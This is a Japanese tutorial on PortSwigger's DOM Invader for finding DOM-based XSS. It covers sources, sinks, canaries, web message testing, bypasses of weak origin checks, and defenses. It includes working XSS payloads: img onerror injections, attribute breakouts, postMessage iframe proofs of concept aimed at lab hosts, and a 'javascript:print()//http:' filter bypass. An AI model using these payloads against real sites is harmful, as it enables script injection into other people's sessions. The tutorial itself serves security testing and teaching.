> 本セクションの典拠となる PortSwigger 公式ドキュメント 3 本（DOM Invader 機能一覧・DOM XSS 検出手順・web message 経由の DOM XSS）はいずれも直接 WebFetch で取得できた。以下の記述は取得した本文の技術的内容（機能一覧・設定項目・検出手順・ペイロード例）に基づいて構成している。ただし DOM Invader は継続的にアップデートされるツールであり、UI のボタン名や設定項目の配置は将来変更されうるため、正確な最新表記は各小節末尾の出典 URL で随時確認されたい。

---

### DOM Invader が解決する問題 — なぜ専用ツールが要るのか

DOM ベース XSS（クライアント側の JavaScript が、攻撃者の制御可能なデータを危険な代入先へ渡してしまうことで起きる XSS）は、反射型・格納型の XSS と違って「サーバのレスポンス HTML を見ても脆弱性が見えない」という厄介な性質を持つ。攻撃の全過程がブラウザ内の JavaScript 実行中に起きるためだ。

手作業で DOM ベース XSS を探す場合、テスターは次の 2 点を追わなければならない。

- **source（ソース／入力の入口）**: 攻撃者が値を注入できる場所。例: `location.search`（URL のクエリ文字列）、`location.hash`（URL の `#` 以降のフラグメント）、`document.referrer`、`window.name`、`postMessage()` で受け取る web message など。
- **sink（シンク／危険な出口）**: そのユーザー入力が最終的に実行・解釈される危険な代入先。例: `element.innerHTML`（HTML として解釈される）、`eval()`（JavaScript として実行される）、`document.write()`、`location.href`（`javascript:` URL を実行しうる）など。

問題は、source から sink までのデータの流れ（データフロー）が、しばしば**数千行に及ぶ難読化・ミニファイ（minify: 変数名を短縮し空白を除去した圧縮）された JavaScript の中を、複数の関数呼び出しをまたいで**通ることだ。これを人間が目視で追い切るのは現実的でない。

DOM Invader はこの「データフロー追跡」を自動化する。仕組みの核心は **canary（カナリア）** と呼ばれる目印文字列である。canary を source に注入し、ブラウザが実際にコードを実行した結果、その canary が**どの sink に到達したか**を DOM Invader が横取りして一覧表示する。これにより、あたかも反射型 XSS を探すかのように「入れた値がどこに出たか」を直接観察できる。ソースコードを一行ずつ読む必要がなくなる、というのが DOM Invader の中心的価値である。

> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Introducing DOM Invader: DOM XSS just got a whole lot easier to find — https://portswigger.net/blog/introducing-dom-invader

補足として、DOM Invader は **2020 年に公開**された比較的新しいツールであり、当初の DOM XSS 検出に加え、その後のバージョンで **web message 経由の検出**、**クライアント側 prototype pollution（プロトタイプ汚染）** や **DOM clobbering（DOM クロバリング）** の検出機能が順次追加されてきた。バージョンによって利用できる機能・UI が異なる点に注意すること。

---

### DOM Invader とは何か（機能全体像）

DOM Invader は、Burp Suite に**内蔵されたブラウザ（built-in browser、Chromium ベース）専用の拡張機能**として最初からインストールされている、ブラウザ内で動作する DOM XSS テストツールである。外部のブラウザには入れられず、Burp の内蔵ブラウザからのみ利用できる点が特徴だ。DOM Invader は多様な source と sink を対象に DOM XSS を検出し、web message ベクトルと prototype pollution ベクトルの両方にも対応する。

主要な機能は次のとおり。

- **Augmented DOM（拡張 DOM ビュー）**
  ブラウザの開発者ツール（DevTools）に DOM Invader 専用タブを追加し、ターゲット内に存在するすべての source と sink を一覧表示する。通常の DOM ツリー表示に、DOM Invader が検出した「ここは source」「ここは sink」という注釈（augment）を重ねて見せてくれる。興味のある sink を見つけたら、そこに渡された値（Value）と、その値が渡された経路を示す **stack trace（スタックトレース: 関数呼び出しの履歴）** を確認でき、canary をハイライト表示してくれる。反射型 XSS を探すのと同じ感覚で「sink に流れ込んだ値」を検査できる。

- **web message のテスト**
  ページ上で `postMessage()` により送受信される web message をすべてログに記録する。さらに、Burp Repeater で HTTP リクエストを改変・再送するのと同じように、**web message を改変して再送**できる。これにより、web message を source とする DOM XSS を手軽に探索できる。手動での改変・再送に加え、DOM Invader が**自動で web message を改変・送信**して脆弱性を探す機能もある。

- **自動プロービング（自動探索）**
  既定では、通常の DOM XSS の source と sink を自動的に探索する。設定を有効にすると、それに加えて**クライアント側 prototype pollution の source を自動的に特定**しようとする。

- **prototype pollution / DOM clobbering の検出**
  攻撃タイプを追加で有効化することで、`Object.prototype` に任意のプロパティを追加できてしまう prototype pollution の source と、それを悪用できる gadget（ガジェット: 汚染したプロパティを読み取って危険な動作をするコード片）を自動走査したり、DOM clobbering（HTML 要素の `id`/`name` 属性でグローバル変数を上書きし、JavaScript の変数参照を乗っ取る攻撃）を自動検出したりできる。

- **高い設定自由度**
  サイトごと・用途ごとに挙動を細かく調整できる。既定でオフの機能が多いのは、canary 注入やイベント自動発火などがターゲットサイトの通常動作を壊してしまい、他のテストを妨げる場合があるためである。

> 出典: DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss

---

### 有効化と基本設定

#### DOM Invader を有効にする

DOM Invader は内蔵ブラウザにプリインストールされているが、**既定では無効**になっている（前述のとおり、一部機能が他のテストを妨げうるため）。有効化の手順は次のとおり。

1. Burp の **Proxy > Intercept** タブを開き、そこから Burp の**内蔵ブラウザ（Burp's browser）を起動**する。
2. ブラウザウィンドウの**右上にある Burp Suite のロゴ**をクリックする。パネルが開き、「Burp Suite Navigation Recorder」と「DOM Invader」の設定タブが表示される。
3. **DOM Invader タブ**に切り替え、トグルスイッチを **On** にする。
4. **Reload（再読み込み）** をクリックしてブラウザを更新する。設定を反映させるにはこの再読み込みが必須である。

設定メニューへは、いつでも右上の Burp Suite ロゴをクリック → DOM Invader タブ、で戻れる。

> なぜ再読み込みが必要か: DOM Invader はページの JavaScript 実行環境に自身のフック（source/sink になりうる関数を横取りする仕掛け）を仕込む。この仕込みはページが読み込まれる**前**に注入される必要があるため、設定変更後は必ずページを再読み込みして、フックが効いた状態でスクリプトを走らせ直す必要がある。

#### canary の設定

設定メニューの下部に、DOM Invader が現在追跡している canary 文字列（ランダム生成された英数字列）が表示される。この canary は**任意の独自文字列に置き換え可能**であり、自分で決めた覚えやすい・ぶつかりにくい文字列を追跡させることもできる。

> canary を変更したいケース: 既定のランダム文字列がたまたまページ内の別の文字列と衝突して誤検出を招く場合や、複数のパラメータの流れを人間側でも区別したい場合に、独自 canary が役立つ。

#### Misc（その他）設定 — 挙動を左右する重要オプション

Misc セクションでは、テストの精度と副作用に直結する次のようなオプションを制御できる。

- **source への canary 自動注入（Auto inject canary in sources）**
  有効にすると、ページ上で特定された source すべてに canary を自動的に注入する。しかもソースごとに canary の末尾へ**固有の文字列を付け足す**ため、「どの source が、どの sink に流れ込んだか」を一目で対応付けられる。
  > 仕組み上の利点: 単一の canary だと複数の source が同じ sink に合流したときに区別できないが、source ごとに末尾を変えることで sink 側に現れた文字列を見るだけで発生元を逆引きできる。

- **重複スタックトレースの非表示（Hide duplicate stack traces）**
  有効にすると、各エントリのスタックトレースを比較し、コード上の**同じ場所**を指す重複エントリを隠す。ノイズを減らして本質的な sink に集中できる。

- **イベントの自動発火（Auto-fire events）**
  有効にすると、ページ読み込み直後に**すべての要素に対して `click` と `mouseover` イベントを自動発火**する。ユーザー操作を起点に初めて実行される（＝操作しないと現れない）source/sink を炙り出すのに有効。
  > 副作用に注意: 全要素をクリック・マウスオーバーするため、リンク遷移やフォーム送信など望まぬ動作を誘発することがある。テスト対象を壊しうる操作なので、必要なときだけ使う。

- **リダイレクトの防止（Redirection prevention）**
  有効にすると、クライアント側リダイレクト（JavaScript による `location` 変更などのページ遷移）を**ブロックして同じページに留まる**。ただし例外として、`javascript:` URL への遷移や、後述の **Inject URL ボタン**が起こす遷移は通常どおり動く。
  > なぜ必要か: DOM XSS のテスト中に対象コードが別ページへ飛ばしてしまうと、sink の観察が中断される。留まることで腰を据えて検証できる。`javascript:` を例外にしているのは、それ自体が実行される sink の検証に不可欠だからである。

#### 攻撃タイプ（Attack types）の有効化

Attack types セクションで、既定の DOM XSS 検出に加えて追加の攻撃探索を有効化できる。

- **Prototype pollution（プロトタイプ汚染）**: トグルを On にして Reload すると、`Object.prototype` に任意プロパティを追加できる source をページから自動チェックする。DOM Invader は複数の汚染テクニックを使うが、**すべてを同時に使うとサイトによっては攻撃が成立しなくなる**ことがあるため、一部を無効化する・一度に 1 テクニックだけ使う、といった調整が推奨される。
- **DOM clobbering**: トグルを On にすると DOM clobbering 脆弱性を自動特定しようとする。ターゲットサイトの機能を壊す可能性があるため、**既定では無効**になっている。

> 出典: Enabling DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling
> 出典: DOM Invader canary settings — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary
> 出典: Miscellaneous DOM Invader settings — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/misc
> 出典: DOM Invader attack types — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/attack-types

---

### DOM ベース XSS の検出手順（source → sink）

ここが DOM Invader の中核機能である。標準的な source（URL パラメータやフォーム入力など）が sink に流れ込んで XSS になるケースを検出する流れを、原理とともに追う。

#### canary の仕組み — なぜ「入れた値がどこに出たか」が分かるのか

DOM Invader は、canary（他とぶつかりにくい、任意の英数字列。「目印」）を source に注入し、ページの JavaScript が実際に実行された結果、その canary が **DOM のどこに・どの sink 関数へ**現れたかを監視する。DOM Invader は DOM を自動的に解析し、あらかじめ定めた canary 文字列の出現箇所を探し出す。

> 原理: DOM Invader は `innerHTML`、`eval`、`document.write`、`location` 代入などの「危険な代入先＝sink になりうる操作」をあらかじめ**フック（横取り）**している。フックされた関数に値が渡されるたびに、その値の中に canary が含まれていれば「source に入れた文字列がここまで到達した」と判定できる。人間がデータフローを追う代わりに、ブラウザの実行そのものに語らせるアプローチである。

#### 基本ワークフロー

1. **canary をコピーする**: DOM Invader タブを選び、**Copy canary（カナリアをコピー）** をクリックする。
2. **canary を source に注入する**: 疑わしい source（URL のクエリパラメータ、`#` フラグメント、フォーム入力欄など）に canary を貼り付ける。
3. **制御可能な sink を特定する**: DOM ビュー（Augmented DOM）に現れる sink の一覧から、canary が到達した sink を探す。
4. **XSS コンテキストを判定する**: sink エントリの **Value 列**を見て、canary が「どんな文脈」で出力されているかを読み取る。属性値の中なのか、タグの外なのか、`<script>` 内なのか、`javascript:` URL としてなのか、で必要なエスケープ・突破手法が変わる。
5. **エクスプロイトを組み立てる**: 判定した XSS コンテキストに合わせた文字列を source に入れ直し、実際に実行できるか（例: `alert()` や `print()` が発火するか）を確認する。

#### sink 詳細ビューで得られる情報

興味深い sink を見つけると、DOM Invader はその sink に入った値と、そこへ至る**スタックトレース**を表示し、canary をハイライトしてくれる。sink の種類に応じて、次のような詳細も確認できる。

- **Outer HTML**: canary を囲んでいる HTML 要素。どのタグ・属性の内側に出力されているかが分かる（＝どこを閉じてブレイクアウトすべきかが分かる）。
- **Frame path**: canary が sink に渡された際の**フレーム（iframe など）のパス**。どのドキュメント内で起きているかを示す。
- **Event**: canary が sink に渡されるきっかけとなった JavaScript の**イベント**（例: クリック時に発火する処理など）。

これらの情報から、XSS コンテキストと、エクスプロイトに必要な文字（`<`, `>`, `"` など）やイベントを容易に判別できる。

#### テストを加速する自動機能

- **Inject URL params（URL パラメータへの自動注入）**: URL のすべてのクエリパラメータに canary を自動注入する。しかも**パラメータごとに別タブ**を使って注入するため、どのパラメータが sink に届くかを個別に確認できる。
- **Inject forms（フォームへの自動注入）**: ページ上で検出された HTML フォームの入力欄すべてに canary を自動注入する。
- **sink に送られた値の検索**: sink へ渡された値の中から特定文字列を検索できる。
- **canary の source 自動注入**（前述の Misc 設定）: source ごとに固有末尾を付けて注入し、発生元を逆引きしやすくする。

#### 実行と PoC 生成（Exploit / Build PoC）

DOM Invader は、確認した脆弱性から**動作するエクスプロイト（概念実証: PoC）をボタン一つで生成**できる。sink の隣にある **Exploit** ボタンや **Build PoC** ボタンを押すと、source・（prototype pollution の場合は）gadget・sink を組み合わせた PoC が生成され、クリップボードにコピーされる。とくに prototype pollution では、DOM Invader が gadget を見つけると、source＋gadget＋sink を自動連結して XSS を確定させる PoC を自動生成できる。

#### 具体例で理解する

たとえば URL に `?search=<canary>` の形で canary を注入したところ、DOM ビューに `innerHTML` sink が現れ、Value 列でその canary が次のように `<div>` 内へそのまま出力されていたとする。

```html
<div id="results">canary文字列</div>
```

これは canary が HTML 要素の**中身（要素コンテンツ）としてそのまま解釈されている**ことを意味する。属性の内側でもスクリプト内でもないため、新しいタグを直接注入できる。そこで source（`search` パラメータ）に次を入れる。

```html
<img src=1 onerror=alert(document.domain)>
```

これが動く理由: `innerHTML` に代入された文字列はブラウザの HTML パーサによって**その場で HTML として再解釈**される。`<img>` の `src=1` は必ず読み込みに失敗するため、失敗時に発火する `onerror` イベントハンドラの JavaScript が実行される。`<script>` タグは `innerHTML` 経由では（仕様上）実行されないため、代わりにイベントハンドラ属性を持つ要素（`img`/`svg` など）を使うのが定石である。

もし Value 列で canary が二重引用符属性の内側（例: `<input value="canary文字列">`）に出ていたなら、まず属性を閉じてタグをブレイクアウトする必要がある。

```html
"><img src=1 onerror=alert(1)>
```

これが動く理由: 先頭の `">` で、開いていた `value="..."` 属性と `<input` タグを閉じ、直後に新しい `<img>` 要素を注入している。属性コンテキストからタグコンテキストへ「脱出（ブレイクアウト）」してから攻撃タグを置く、という XSS の基本手筋である。

> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Testing for DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/dom-xss
> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

---

### web message 経由の DOM ベース XSS の検出

DOM Invader の真価がとくに発揮されるのが、**web message（ウェブメッセージ）** を source とする DOM XSS の検出である。これは手作業では非常に見つけにくいため、専用機能の恩恵が大きい。

#### 前提: postMessage と web message の仕組み

`postMessage()` は、**異なるオリジン（プロトコル＋ホスト＋ポートの組。例: `https://a.example` と `https://b.example` は別オリジン）に属するウィンドウ／iframe 同士が、安全に文字列データをやり取りするためのブラウザ API** である。送信側は次のように書く。

```javascript
// 送信側: targetWindow へメッセージを送る
targetWindow.postMessage(data, targetOrigin);
```

受信側は `message` イベントを購読して受け取る。

```javascript
// 受信側: 届いたメッセージを処理する
window.addEventListener('message', function(e) {
  // e.data   … 送られてきたデータ本体
  // e.origin … 送信元のオリジン
  // e.source … 送信元の window オブジェクトへの参照
});
```

受信側イベントオブジェクトの主要プロパティは 3 つ。

- **`e.data`**: メッセージ本体（攻撃者が仕込むペイロードの置き場）。
- **`e.origin`**: メッセージの送信元オリジン。**本来はここを厳密に検証して、信頼できる送信元からのメッセージだけを処理すべき**。
- **`e.source`**: 送信元 window への参照（多くは iframe）。

#### 脆弱性の成立条件

**web message DOM XSS は、受信側（destination origin）が「送信側は悪意あるデータを送ってこない」と信頼してしまい、受け取ったデータを危険な sink へ安全でない形で渡すときに発生する。** 典型的には、`e.origin` を検証せず（あるいは検証が不完全なまま）、`e.data` を `innerHTML` や `eval`、`location.href` などへ流し込むコードが該当する。

最も素朴で危険なパターンはこれだ。

```javascript
window.addEventListener('message', function(e) {
  eval(e.data);   // 送られてきた文字列をそのまま JavaScript として実行
});
```

これが危険な理由: `e.origin` を一切見ずに `e.data` を `eval()` に渡している。攻撃者が任意のページから（あるいは被害者に開かせた iframe から）このウィンドウへ `postMessage('alert(1)', '*')` を送れば、その文字列が JavaScript として実行される。攻撃者は次のような**攻撃ページ**を用意し、被害者に開かせるだけでよい。

```html
<iframe src="https://victim.example/" onload="this.contentWindow.postMessage('print()','*')"></iframe>
```

これが動く理由: iframe に被害サイトを読み込み、`onload`（読み込み完了時）に、その iframe の中身（`contentWindow`）へ向けて web message を送っている。第 2 引数の `'*'`（targetOrigin）は「どのオリジンでも受け取ってよい」の意で、攻撃者側から送るときに送信先を限定しない指定である。受信側が origin を検証していないため、外部から送ったメッセージがそのまま `eval` される。

#### message event のプロパティから脆弱性を読む

DOM Invader の Messages ビューでは、記録された各メッセージについて、**クライアント側 JavaScript が `origin`／`data`／`source` の各プロパティに実際にアクセスしたかどうか**を確認できる。これが強力な手がかりになる。

- **`origin` にアクセスしていない** → 送信元オリジンを検証していない可能性が高い（＝どこからでも送り込める）。
- **`data` にアクセスしていない** → データが一切使われていないので、そのメッセージは**悪用できない**（sink へ渡りようがない）。
- **`source` にアクセスしていない** → 送信元（多くは iframe）を検証していない可能性が高い。

この 3 点を見るだけで、「このメッセージは攻略できるか、どう攻めるか」の当たりを素早く付けられる。

#### DOM Invader の web message 機能

DOM Invader は web message テストのために次を提供する。

- ページ上で `postMessage()` により送られた web message を**すべてログに記録**する（付随情報つき）。
- Burp Repeater のように、web message を**改変して再送**し、手動で DOM XSS を探れる。
- DOM Invader が**自動でメッセージを改変・送信**して、代わりに DOM XSS を探ってくれる。
- 観測された挙動に基づき、DOM Invader は**悪用可能と判断したメッセージに推定 Severity（深刻度）と Confidence（確信度）を表示**して自動フラグ付けする。自動検出しきれない脆弱性を含む可能性を考慮し、ページ上で送られた**すべてのメッセージが少なくとも Information（情報）深刻度で一覧される**。

#### origin 検証の不備を自動で炙り出す仕組み（重要）

多くの実装は origin を検証しているつもりでも、検証ロジックが甘い。DOM Invader はこの甘さを自動で突く。**DOM Invader は、送るメッセージの origin を「本物のオリジンのドメイン名で始まり、かつ同じドメイン名で終わる」偽オリジンに自動で置き換える**。これにより、`indexOf`／`startsWith`／`endsWith` や正規表現による**不完全な origin 検証に依存したイベントハンドラを自動的に特定**できる。

代表的な検証不備と、その突破例を示す。

```javascript
// 不備例1: 部分一致（含まれていればOK）にしてしまっている
window.addEventListener('message', function(e) {
  if (e.origin.indexOf('normal-website.com') !== -1) {
    // 信頼して処理してしまう
  }
});
```

突破される理由: `indexOf` は「文字列のどこかに含まれるか」しか見ない。攻撃者のオリジンが `http://www.normal-website.com.evil.net` であれば、その中に `normal-website.com` という部分文字列が**含まれてしまう**ため、検証を通過する。ドメインは実際には攻撃者の `evil.net` 配下である。

```javascript
// 不備例2: 前方一致だけ／後方一致だけを見ている
if (e.origin.startsWith('https://normal-website.com')) { /* ... */ }  // 前方一致のみ
if (e.origin.endsWith('normal-website.com')) { /* ... */ }           // 後方一致のみ
```

突破される理由: `startsWith` は `https://normal-website.com.evil.net` のような「本物で始まるが別ドメイン」に騙され、`endsWith` は `https://evil-normal-website.com` のような「本物で終わるが別ドメイン」に騙される。DOM Invader が偽オリジンを「本物で始まり本物で終わる」形に作るのは、まさにこの両パターンを同時に検出するためである。正しい検証は**完全一致（`e.origin === 'https://normal-website.com'`）**でなければならない。

#### 手動テストと PoC 生成

Messages ビューから任意のメッセージをクリックすると詳細ダイアログが開く。メッセージ情報を確認して**データが最終的にどの sink に入るか（sink の種類）**を見極め、**Data フィールドを sink の種類に合ったエクスプロイトに書き換えて Send（送信）** する。`<`, `>`, `"` などがエスケープされるかを試し、エスケープされないなら、それらを使って概念実証ペイロードを組み立てて送る。

脆弱なイベントリスナーを見つけ、Data ボックスでエクスプロイトを組み立てられたら、**Build PoC（PoC 生成）ボタン**を押すだけで、レポートに添付できる HTML の概念実証がクリップボードにコピーされる。

#### 具体例1: innerHTML に流し込むリスナー

受信したメッセージ本体をそのまま `innerHTML` へ入れているケース（例: `ads` という ID の `<div>` に広告 HTML として挿入する実装）。

```javascript
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;  // origin 検証なし
});
```

攻撃ページ（PoC）:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```

動く理由: origin を検証していないため外部から送ったメッセージが処理され、その文字列が `innerHTML` に代入されて HTML として再解釈される。`<img src=1 onerror=print()>` は画像読み込みに失敗して `onerror` が発火し、`print()` が実行される（ラボでは `print()` の実行が解答条件として使われる）。

#### 具体例2: JSON.parse を挟むリスナー

メッセージを JSON として解釈し、`type` プロパティで処理を分岐、`load-channel` の場合に iframe の `src`（あるいは `location.href`）を書き換える実装。

```javascript
window.addEventListener('message', function(e) {
  var data = JSON.parse(e.data);
  switch (data.type) {
    case 'load-channel':
      document.getElementById('ifr').src = data.url;  // url が location/href 系 sink に流れる
      break;
  }
});
```

攻撃ページ（PoC）:

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

動く理由: 送るデータを JSON 文字列にして `type` を `load-channel` に合わせ、`url` に `javascript:print()` を指定している。受信側はこれを `src`／`location.href` 系の sink に渡すため、`javascript:` URL が実行される。`location.href = 'javascript:...'` や `iframe.src = 'javascript:...'` は URL を JavaScript として実行しうる、という点が sink たるゆえんである。

#### 具体例3: 不完全な origin/内容検証を突く JavaScript URL

`e.data` の中に `http:` または `https:` が含まれるかを `indexOf` で確認し、含まれていれば安全とみなして `location` に渡してしまう実装。

```javascript
window.addEventListener('message', function(e) {
  if (e.data.indexOf('http:') > -1 || e.data.indexOf('https:') > -1) {
    location.href = e.data;   // http/https が含まれていれば通してしまう
  }
});
```

突破ペイロード（Data に入れて送る値）:

```
javascript:print()//http:
```

動く理由: 検証は「`http:` という文字列が含まれるか」しか見ていない。末尾に `//http:` を付ければこの部分一致チェックを通過する。一方 `//` 以降は JavaScript の行コメントとして無視されるため、実際に実行されるのは先頭の `javascript:print()` だけである。「検証を満たす無害な文字列」と「実行される悪意ある文字列」を 1 行に共存させる、DOM XSS 頻出のテクニックである。

> 出典: Testing for DOM XSS using web messages — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages
> 出典: Testing for web message DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss
> 出典: Controlling the web message source（Web Security Academy） — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
> 出典: Web message manipulation（Web Security Academy） — https://portswigger.net/web-security/dom-based/web-message-manipulation

---

### 実践ワークフローのまとめ（チェックリスト）

DOM Invader を使った DOM XSS テストの一連の流れを、実務で使える順序でまとめる。

1. **有効化**: Proxy > Intercept から内蔵ブラウザを起動 → 右上ロゴ → DOM Invader タブでトグル On → Reload。
2. **目的に応じた設定**:
   - 反射型ライクな DOM XSS を広く探すなら、Misc の「source への canary 自動注入」を On。
   - 操作起点の source を炙るなら「Auto-fire events」を On（副作用に注意）。
   - 遷移で観察が中断するなら「Redirection prevention」を On。
   - prototype pollution / DOM clobbering を探すなら Attack types で該当トグルを On（1 テクニックずつが安全）。
3. **標準 source のテスト**: Copy canary → URL パラメータ／フラグメント／フォームへ注入（`Inject URL params`／`Inject forms` で自動化）。
4. **sink の確認**: Augmented DOM の sink 一覧で canary の到達先を確認。Value 列で XSS コンテキストを判定。Outer HTML／Frame path／Event とスタックトレースで文脈を精査。
5. **web message のテスト**: Messages ビューでログを確認。`origin`／`data`／`source` のアクセス有無から攻略可否を判断。Data を書き換えて Send、または自動送信に任せる。origin 検証不備は偽オリジン自動置換が検出。
6. **エクスプロイト確定**: コンテキストに合ったペイロードで `alert`／`print` を発火。
7. **PoC 生成**: Exploit／Build PoC ボタンで PoC をクリップボードへ。レポートに添付。

---

### 防御策（開発者向けの原則）

DOM Invader は攻撃者・テスター側の道具だが、検出される脆弱性を作らないための防御原則も押さえておく。

- **危険な sink を避ける**: ユーザー制御データを `innerHTML`・`document.write`・`eval`・`location`／`href` 代入・`setTimeout(文字列)` などへ渡さない。HTML を組み立てる必要があるなら `textContent` を使う、あるいは `element.setAttribute` で属性値として安全に設定する。動的な HTML 挿入がどうしても必要なら、実績あるサニタイズライブラリ（例: **DOMPurify**）を使う。
  > バージョン注意: サニタイザにも既知のバイパスが定期的に見つかる。たとえば **DOMPurify は 2.0.17 未満**に mXSS（mutation XSS: ブラウザの HTML 再解析でサニタイズ後に危険化する攻撃）のバイパスが存在し修正済みである。ライブラリは必ず最新に保ち、公開年・修正状況を追うこと。
- **web message の origin を完全一致で検証する**: `e.origin === 'https://trusted.example'` のように厳密比較する。`indexOf`／`startsWith`／`endsWith`／緩い正規表現は前掲のとおり突破される。
- **送信側は targetOrigin を明示する**: `postMessage(data, 'https://trusted.example')` のように送信先オリジンを限定し、`'*'` を避ける（機密データが第三者フレームへ漏れるのを防ぐ）。
- **受信データをそのまま実行・挿入しない**: `JSON.parse` で構造化し、期待するスキーマ・値だけを許可（許可リスト方式）してから使う。
- **多層防御として CSP（Content Security Policy）を導入する**: インライン `<script>` やイベントハンドラ属性の実行を禁止し（`script-src` からインラインを排除、`unsafe-inline` を付けない）、`javascript:` の実行も抑止する。CSP はブラウザが**ソース許可リストを評価**して許可されないスクリプト実行をブロックする仕組みで、XSS が混入しても被害を軽減する最後の砦になる。

> 出典: DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Testing for web message DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss

---

## DOM Invader補足（HackTricks / Medium）

DOM Invaderは、Burp Suite Professional/Community 2023年以降のバージョンに同梱されている、DOM Invaderという名の**ブラウザ内蔵型の解析ツール**です。Burpの組み込みブラウザ（Chromiumベース）に拡張機能としてプリインストールされており、DOMベースXSS・クライアントサイドprototype pollution・DOM clobberingという3系統の脆弱性を、手動でJavaScriptコードを1行1行追わなくても発見できるように設計されています。本節では、公式のPortSwiggerドキュメントで機能・操作手順を正確に押さえたうえで、HackTricksとMedium記事が強調している実践的なワークフローを補足します。ラボの具体的な攻略手順（どのペイロードでどのラボを解くか）には立ち入らず、あくまで**ツールの仕組みと使い方**に焦点を当てます。

### DOM Invaderとは何か、なぜ必要か

古典的な反射型XSSは「サーバのHTTPレスポンスに攻撃者の入力がそのまま出力される」というモデルで説明できるため、Burp Proxyの履歴やRepeaterで入出力を突き合わせれば発見できます。しかしDOMベースXSSは違います。攻撃者の入力（`location.hash`、`document.referrer`、`postMessage`のデータなど）はサーバを経由せず、**ブラウザ内のJavaScriptが直接読み取り、DOM操作用の危険なAPI（sink）に渡す**ことで初めて脆弱性になります。つまり脆弱性の発生地点はHTTPレスポンスの中ではなく、実行時のJavaScriptの制御フローの中にあります。

このため、DOMベースXSSを見つけるには本来「ページ内の全JavaScriptを読み、どの変数がユーザ入力に由来し、それがどの危険な関数に渡っているか」をソースコードレベルで追跡する必要があり、難読化されたコードやバンドルされたコードでは非常に手間がかかります。DOM Invaderはこの追跡作業を自動化し、ブラウザが実際にコードを実行する瞬間にsource/sinkの経路を計装（instrument）して捕捉します。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

### 有効化の手順（公式ドキュメントに基づく正確な操作）

DOM InvaderはBurpの組み込みブラウザに標準搭載されていますが、**デフォルトでは無効**になっています。誤って一般サイトの動作を妨げないようにするための安全策です。有効化手順は次の通りです。

1. Burp Suiteの「Proxy」タブ内「Intercept」から、組み込みブラウザ（Burpのブラウザ）を起動する。
2. ブラウザ右上のBurp Suiteロゴ（パズルピースアイコン）をクリックする。ロゴが見えない場合は、拡張機能アイコンからジグソーパズルのアイコンを探してクリックする。これで「Navigation Recorder」と「DOM Invader settings」の2つのパネルが開く。
3. 「DOM Invader settings」の中の "**DOM Invader is on**" というトグルスイッチをオンにする。
4. 「Reload」ボタンをクリックして設定変更をページに反映させる（DOM Invaderはページ読み込み時にJavaScriptを計装する仕組みのため、既に開いているページには反映されない）。
5. ブラウザ上で右クリック→「Inspect」でDevToolsを開くと、新しく「DOM Invader」タブが追加されている。パネルはDevToolsの下部にドッキングしておくと最も使いやすい。

さらに、「Settings > Tools > Burp's browser」で「**Store settings and history after closing**」をオフにしておくと、DOM Invaderの状態（有効化フラグやcanary値など）がブラウザを閉じた際にリセットされる。逆にオンのままにしておけば設定が永続化される。

> 出典: PortSwigger公式ドキュメント（Enabling DOM Invader） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling

### canary（カナリア）という中核概念

DOM Invaderの動作原理の核は「**canary**」と呼ばれる、通常の利用者の入力には決して現れないユニークな英数字文字列です。PortSwigger公式は次のように定義しています。

> 「an arbitrary but distinct string of alphanumeric characters that you can inject into different sources to see which sinks they flow into」（さまざまなソースに注入し、それがどのシンクに流れ込むかを観察するための、任意だが他と区別できる英数字文字列）

デフォルト値はツールによって`burpdomxss`のような固定文字列が使われることが多く（Medium記事では初期値の例として言及）、設定画面からカスタムの値に変更できます。HackTricksが強調しているポイントとして、**canaryの値は他の一般的な文字列（`test`など）と被らない、十分にユニークな文字列にすべき**という注意があります。理由は単純で、ページ内のJavaScriptやCSSセレクタ、正規表現の中にたまたま`test`という文字列が既に存在していると、DOM Invaderがそれを「注入した入力がsinkに到達した」と誤検知（false positive）してしまうためです。ユニークなcanaryを使うことで、DOMツリー内に出現する箇所は「本当に自分が注入した経路」だけに限定できます。

canary文字列はDevToolsのDOM Invaderパネル左上に常に表示されており、これを見ながら「今どの文字列を追跡しているか」を確認する運用になります。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html
> 出典: DOM Invader: Burp Suite tool to find DOM based XSS easily — Medium (hacksheets) — https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

### DOM XSS検出の仕組みとワークフロー

#### 注入方法

DOM Invaderはcanaryをページに送り込む方法として複数の手段を用意しています。

- **手動注入**: 開発者自身がURLのクエリパラメータやフォーム入力欄に、DevToolsパネルからコピーしたcanary文字列を貼り付ける。
- **Inject URL params**: DOM Invaderが自動的にページ内のクエリパラメータ一つひとつにcanaryを注入し、それぞれ別タブで開いて結果を観察する。手動で全パラメータを試す手間を省ける。
